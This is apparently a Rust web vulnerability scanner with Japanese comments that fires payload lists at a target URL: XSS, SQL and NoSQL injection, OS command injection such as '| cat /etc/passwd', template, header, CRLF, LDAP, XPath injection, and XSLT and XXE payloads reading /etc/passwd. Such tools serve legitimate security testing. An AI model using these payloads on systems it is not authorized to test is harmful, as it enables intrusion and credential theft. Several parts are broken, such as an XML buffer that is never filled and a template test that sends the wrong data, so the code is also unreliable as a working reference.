use reqwest::Client;
use std::collections::HashMap;
use std::error::Error;
use serde_json::{json, Value};
use ldap3::{LdapConn, Scope, SearchEntry};
use quick_xml::events::Event;
use quick_xml::reader::Reader;
use sxd_document::{parser, Package};
use sxd_xpath::{evaluate_xpath,Context, Factory};
use libxslt::parser::parse_file; //元は、parse_stylesheet
use libxml::parser::Parser;
use libxml::tree::Document;
use std::env;
use std::process::exit;



// XSS, SQLi, OSコマンドインジェクションなどのペイロード
const XSS_PAYLOADS: [&str; 7] = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')>",
    "<input type='text' value='XSS' onfocus='alert(\"XSS\")'>",
];

const SQL_PAYLOADS: [&str; 5] = [
    "' OR '1'='1",
    "1' OR '1'='1' --",
    "' OR 1=1--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT username, password FROM users--",
];

const OS_COMMAND_PAYLOADS: [&str; 3] = [
    "; ls",
    "&& whoami",
    "| cat /etc/passwd",
];


fn get_nosql_payloads() -> Vec<serde_json::Value> {
    vec![
        json!({ "username": { "$ne": "" } }),
        json!({ "username": "admin", "password": { "$ne": "" } }),
        json!({ "$where": "this.username == 'admin' && this.password != 'password'" }),
        json!({ "username": { "$gt": "" } }),
        json!({ "username": null, "password": { "$ne": null } })
    ]
}

const CSTI_PAYLOADS: &[&str] = &[
    "{{7*7}}",            // Jinja2, Twig
    "${7*7}",             // Freemarker
    "<%= 7 * 7 %>",       // ERB (Ruby)
    "{7*7}",              // AngularJS
    "{{config.items()}}", // Jinja2
];

const HEADER_INJECTION_PAYLOADS: &[(&str, &str)] = &[
    ("User-Agent", "Mozilla/5.0\r\nX-Injection: injected"),
    ("Referer", "http://example.com\r\nX-Fake-Header: injected"),
    ("Host", "victim.com\r\nX-Forwarded-Host: attacker.com"),
];

const LDAP_PAYLOADS: [&str; 5] = [
    "*)(&(objectClass=*))",
    "*)|(&(objectCategory=person)(objectClass=user))",
    "*)(&(objectCategory=person)(cn=*))",
    "*))(|(objectClass=*))",
    "*)(uid=*))(|(uid=*))"
];

fn get_json_payloads() -> Vec<Value> {
    vec![
        json!({"user_id": "123' OR '1'='1"}),
        json!({"user": {"id": 123, "role": "admin"}}),
        json!({"user_id": [123, "admin"]}),
        json!({"$where": "this.user_id == '123'"}), // MongoDB NoSQL Injection
        json!({"user_id": {"$gt": 0}}), // NoSQL Injection
    ]
}

const CRLF_PAYLOADS: [&str; 3] = [
    "%0d%0aX-Injected-Header: InjectedValue",
    "%0d%0aSet-Cookie: session=attacker",
    "%0d%0aContent-Length: 0%0d%0a%0d%0a<script>alert(1)</script>",
];

static UNICODE_PAYLOADS: &[&str] = &[
    "admin",
    "adm\u{202E}nim",  // 逆向き制御文字
    "ad\u{043C}in",    // キリル文字の「м」
    "админ",           // 完全キリル文字
    "admin\u{200B}",   // ゼロ幅スペース
];

const XPATH_PAYLOADS: [&str; 5] = [
    "' or '1'='1",
    "\" or \"1\"=\"1",
    "' or 1=1 or ''='",
    "\" or 1=1 or \"\"=\"",
    "1' or '1'='1"
];

const XSLT_PAYLOAD: &str = 
    r#"
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///etc/passwd')" />
        </xsl:template>
    </xsl:stylesheet>
    "#;

const XXE_PAYLOAD: &str = r#"<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>"#;

//ファジング関数
async fn fuzz(url:&str, params: &HashMap<&str, &str>, payloads: &[&str]) {
    let client =Client::new();

    //基準となるレスポンスを取得
    let base_response = client.get(url).send().await.unwrap().text().await.unwrap();

    for &payload in payloads {
        let mut test_params = params.clone();
        let keys: Vec<_> = test_params.keys().cloned().collect();
        for key in keys {
            test_params.insert(key, payload);
        }

        let response = client.get(url).query(&test_params).send().await;
        match response {
            Ok(resp) => {
                let response_text = resp.text().await.unwrap();
                if response_text != base_response {
                    println!("[!] Potential Injection Found!");
                    println!("[*] Payload: {}", payload);
                } else {
                    println!("[-] No issue found for payload: {}", payload);
                }
            }
            Err(e) => println!("[!] Error with payload {}: {:?}", payload, e),
        }
    }
}


//nosqlインジェクション関数
async fn test_nosql_injection(url: &str, base_payload: serde_json::Value) -> Result<(), Box<dyn Error>> {
    let client = Client::new();

    //比較用のベースレスポンスを取得
    let response = client.post(url).json(&base_payload).send().await?;
    let base_result = response.text().await?;

    //NoSQLインジェクションペイロードをテスト
    let nosql_payloads =  get_nosql_payloads();
    for payload in nosql_payloads {
        let response = client.post(url).json(&payload).send().await?;
        //ステータスコードの取得
        let status = response.status();

        //本文を取得（ここで response が move される）
        let response_text = response.text().await?;

        //
        if status != 200 || response_text != base_result {
            println!("[+] NoSQL Injection Found! Payload: {}", payload);
        } else {
            println!("[-] NoSQL Not Found | {:?}", payload);
        }

    }
    Ok(())
}

//CSTIテストの関数
async fn test_csti(url: &str, params: &HashMap<&str, &str>) -> Result<(), Box<dyn Error>> {
    let client = Client::new();
     
    for payload in CSTI_PAYLOADS {
        println!("Testing CSTI Payload: {}", payload);

        let mut test_params = params.clone();
        test_params.insert("input", payload); //テストするパラメータを挿入
        
        let response = client.post(url).json(&payload).send().await?;

        let body = response.text().await?;

        // 期待される計算結果が含まれている場合はCSTIの可能性あり
        if body.contains("49") || body.contains("{{") || body.contains("${") {
            println!("[!] CSTI detected with payload: {}", payload);
        } else {
            println!("[+] No CSTI detected for: {}", payload);
        }
    } 
    Ok(())
}

//http header injectionテスト関数
async fn test_http_header_injection(url: &str) -> Result<(), Box<dyn Error>> {
    let client = Client::new();

    for (header_name, payload) in HEADER_INJECTION_PAYLOADS {
        let mut headers = reqwest::header::HeaderMap::new();

        headers.insert(
            reqwest::header::HeaderName::from_bytes(header_name.as_bytes())?,
            reqwest::header::HeaderValue::from_str(payload)?,
        );

        let response = client.get(url).headers(headers).send().await?;

        // ステータスコードを取得
        let status = response.status();

        // 異常なレスポンスを検知
        if status.is_server_error() || status.is_redirection() {
            println!(
                "[!] Potential HTTP Header Injection detected! (Header: {} -> Payload: {})",
                header_name, payload
            );
        }
    }
Ok(())
}

    //LDAPインジェクション関係
    //ldapかそうじゃないかで分ける関数
    async fn judge_target_url(url: &str) -> Result<Option<&str>, Box<dyn Error>> {
        if url.starts_with("ldap://") {
            println!("LDAP URL detected: {}", url);
            Ok(Some(url))
        } else {
            println!("The URL is not an LDAP URL.");
            Ok(None)
        } 
    }        
        
    //base_dcを取得する関数
    async fn get_base_dc(url: &str)  -> Result<Option<String>, Box<dyn Error>> {
        let mut parts = url.rsplitn(2, '.');
        let extension = parts.next().unwrap_or("").to_string();
        let domain = parts.next().unwrap_or("").to_string();

        if domain.is_empty() {
            return Ok(None);
        } 

        let base_dc = format!("dc={}, dc={}", domain, extension);
        Ok(Some(base_dc))
    }

    //LDAPインジェクションテストする関数
    async fn test_ldap_injecion(ldap_url: &str, base_dc: &str) -> Result<(), Box<dyn Error>> {
        let mut ldap = LdapConn::new(ldap_url)?;

        for payload in LDAP_PAYLOADS {
            let filter = format!("uid={}", payload);
            println!("Testing payload: {}", filter);

            let (rs, _res) = ldap.search(
                &base_dc, 
                Scope::Subtree, 
                &filter, 
                vec!["cn", "uid"])?.success()?;

            for entry in rs {
                let search_entry = SearchEntry::construct(entry);
                println!("Possible Injection! Found entry: {:?}", search_entry);
            }
        }

        Ok(())
    }


    //JSONインジェクションテストする関数
    async fn test_json_injection(url: &str) -> Result<(), Box<dyn Error>> {
        let client = Client::new();
        let payloads = get_json_payloads();

        for payload in payloads {
            match client.post(url).json(&payload).send().await {
                Ok(response) => {
                    let status = response.status();
                    match response.text().await {
                        Ok(body) => {
                            println!("Sent: {}\nResponse: {} - {}", payload, status, body);
                        }
                        Err(e) => {
                            eprintln!("Failed to read response body for payload: {}\nError: {}", payload, e);
                        }
                    }
                }
                Err(e) => {
                    eprintln!("Failed to send request for payload: {}\nError: {}", payload, e);
                }
            }
        }
    Ok(())
    }


    //CRLFインジェクションテストする関数
    async fn test_crlf_injection(url: &str) -> Result<(), Box<dyn Error>> {
        let client = Client::new();

        for payload in &CRLF_PAYLOADS {
            let url = format!("{}?param={}", url, payload);
            println!("Testing payload: {}", payload);

            //リクエスト送信とエラーハンドリング
            let response = match client.get(&url).send().await {
                Ok(resp) => resp,
                Err(e) => {
                    eprintln!("Request failed for {}: {}", url, e);
                    continue; // エラー時は次のペイロードへ
                }
            };

            //レスポンスのステータスコードチェック
            if !response.status().is_success() {
                eprintln!("Non-success status code: {}", response.status());
                continue;
            }

             // ヘッダー取得
            let headers = response.headers();
            println!("Response Headers:");
            let mut injected_headers: HashMap<String, String> = HashMap::new();

            for (key, value) in headers.iter() {
                if let Ok(value_str) = value.to_str() {
                    injected_headers.insert(key.to_string(), value_str.to_string());
                }
                else {
                    eprintln!("Failed to read header: {}", key);
                }
            }

            // ヘッダー内に不正な挿入がないか確認
            for crlf_payload in CRLF_PAYLOADS.iter() {
                if injected_headers.values().any(|v| v.contains(crlf_payload)) {
                    println!("Possible CRLF Injection detected! Payload: {}", crlf_payload);
                }
            }

        }
        
        Ok(())
    }


    //Unicodeインジェクションテストする関数
    async fn test_unicode_injection(url: &str) -> Result<(), Box<dyn Error>> {
        let client = Client::new();

        // 正常時のレスポンスを取得
        let normal_payload = json!({ "username": "admin", "password": "password" });

        let normal_response = match client.post(url).json(&normal_payload).send().await {
            Ok(response) => match response.text().await {
                Ok(text) => text,
                Err(e) => {
                    eprintln!("Failed to get response for request: {}", e);
                    return Err(Box::new(e));
                }
            }
            Err(e) => {
                eprintln!("Failed to send request for payload: {}", e);
                return Err(Box::new(e));
            }
        };
        
        println!("Successful Response!: {}", normal_response);

        //Unicodeインジェクションテスト
        for payload in UNICODE_PAYLOADS {
            let test_payload = json!({"username": payload, "password": "password"});

            match client.post(url).json(&test_payload).send().await {
                Ok(response) =>  match response.text().await {
                    Ok(response_text) => {
                        println!(" payload: \"{}\", response: \"{}\"", payload, response_text);

                          // 正常時のレスポンスと異なる場合、Unicodeインジェクションの可能性あり
                          if response_text != normal_response {
                            println!("Possible Unicode Injection detected! Payload: \"{}\"", payload);
                          }
                    }
                    Err(e) => {
                        eprintln!(" Payload \"{}\" Failed to get response for request: {}", payload, e);
                    }
                }
                Err(e) => {
                    eprintln!(" Payload \"{}\" Failed to send request for payload: {}", payload, e);
                }
            }
        }
        Ok(())
    }


    //XMLをスクレイピングする関数
    async fn scrape_xml(url: &str, tag_name: &str) -> Result<Vec<String>, Box<dyn Error>> {
        //URLからXMLデータを取得
        let response = reqwest::get(url).await?.text().await?;

        let mut reader = Reader::from_str(&response);
        reader.config_mut().trim_text(true); // 要素の前後の改行・空白(インデントなど)は削除する

        let mut results = Vec::new();

        //XMLを解析
        while let Ok(event) = reader.read_event() {
            match event {
                Event::Start(ref e) if e.name() == quick_xml::name::QName(tag_name.as_bytes()) => {
                    if let Ok(text) = reader.read_text(quick_xml::name::QName(tag_name.as_bytes())) {
                        results.push(text.to_string());
                    }
                }
                Event::Eof => break,
                _ => {}
            }
            
        }
        Ok(results)
    }


    //XPathインジェクションをテストする関数
    async fn test_xpath_injection(xml_data: &str, xpath_query: &str) -> Result<(), Box<dyn Error>> {
        //XMLパーサーの作成
        let package: Package = parser::parse(xml_data)?;
        let document = package.as_document();

        for payload in XPATH_PAYLOADS.iter() {
            let injected_query = format!("{}{}", xpath_query, payload);

            let context = Context::new();
            let factory = Factory::new();
            let xpath = factory.build(&injected_query)?.unwrap(); // XPath クエリをコンパイル

            let root = document.root(); // `document.root()` は `Node` 型
            let result = xpath.evaluate(&context, root);  // 修正: `evaluate_xpath()` は使わず、`xpath.evaluate()` を使用

            match result {
                Ok(value) => {
                    println!("Payload: {} -> Result: {:?}", payload, value);
                }
                Err(e) => {
                    println!("Possible XPath Injection detected with payload: {}", payload);
                    println!("Error: {}", e);
                }
            }
        }
       Ok(())
    }


    //XSLTインジェクションをテストする関数
    async fn test_xslt_injection(xslt_payload: &str, xml_data: &str) -> Result<Document, Box<dyn Error>> {
        //XSLT スタイルシートのパース
        let mut stylesheet = parse_file(xslt_payload)?;

        //XML データのパース
        let parser = Parser::default();
        let doc = parser.parse_string(xml_data)?;

        //XSLT を適用
        let transformed_xml = stylesheet.transform(&doc, (&[]).to_vec())?;
        

        Ok(transformed_xml) // `Document` をそのまま返す
    }

    //XXEをテストする関数
    async fn test_xxe(xml_data: &str) -> Result<String, Box<dyn Error>> {
        let mut reader = Reader::from_str(xml_data);
        reader.config_mut().trim_text(true);

        let mut extracted_data = String::new();

        while let Ok(event) = reader.read_event() {
            match event {
                Event::Text(e) => {
                    extracted_data.push_str(&e.unescape()?.to_string());
                }
                Event::Eof => break,
                _ => {}
            }
        }
 

        Ok(extracted_data)
    }


#[tokio::main]
async fn main () -> Result<(), Box<dyn Error>> {  
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("Usage: {} <target_url>", args[0]);
        std::process::exit(1);
    }
    
    let target_url = &args[1];

    let mut params = HashMap::new();
    params.insert("username", "test");
    params.insert("password", "password");
    
    println!("=== Fuzzing ===");
    println!("Starting Fuzzing...");
    fuzz(&target_url, &params, &XSS_PAYLOADS).await;
    fuzz(&target_url, &params, &SQL_PAYLOADS).await;
    fuzz(&target_url, &params, &OS_COMMAND_PAYLOADS).await;

    println!("=== NoSQLInjection test ===");
    let base_payload = json!({ "username": "test", "password": "password" });
    test_nosql_injection(&target_url, base_payload).await;

    println!("=== CSTI Test ===");
    test_csti(&target_url, &params).await;

    println!("=== HTTP Header Injection Test ===");
    test_http_header_injection(target_url).await;

    println!("=== LDAP Injection Test ===");
    let ldap_url= judge_target_url(target_url).await;
    let binding_ldap = ldap_url.expect("REASON");
    let ldap_url_str = binding_ldap.as_deref().unwrap_or(""); //ldap_urlをStringから&strに変換
    let base_dc = get_base_dc(target_url).await;
    let binding_base_dc = base_dc.expect("REASON");
    let base_dc_str = binding_base_dc.as_deref().unwrap_or("");//base_dcをStringから&strに変換

    match test_ldap_injecion(ldap_url_str, base_dc_str).await {
        Ok(_) => println!("LDAP Injection test completed."),
        Err(e) => eprintln!("Error: {}", e),
    }

    println!("=== JSON Injection Test ===");
    test_json_injection(target_url).await;

    println!("=== CSLF Injection Test ===");
    test_crlf_injection(target_url).await;

    println!("=== Unicode Injection Test ===");
    test_unicode_injection(target_url).await;


    println!("Scan XML file......");
    let tag_name = "title";
    let mut xml_data = Vec::new();

    match scrape_xml(target_url, tag_name).await {
        Ok(results) => {
            for item in &results {
                println!("Extracted: {}", item);
            }
            let xml_data: Vec<&str> = results.iter().map(|s| s.as_str()).collect();
        }
        Err(e) => eprintln!("Error: {}", e),
    }


    println!("=== XPath Injection Test ===");
    let xpath_query = "/users/user[name='";

    println!("Starting XPath Injection Test...");
    test_xpath_injection(xml_data.first().map(|s: &String| s.as_str()).unwrap_or(""), xpath_query).await;

    println!("=== XSLT Injection Test ===");
    test_xslt_injection(XSLT_PAYLOAD, xml_data.first().map(|s: &String| s.as_str()).unwrap_or("")).await;
    println!("=== XXE Injection Test ===");
    test_xxe(xml_data.first().map(|s: &String| s.as_str()).unwrap_or("")).await;

    println!("Finish check!");
    
    Ok(())
}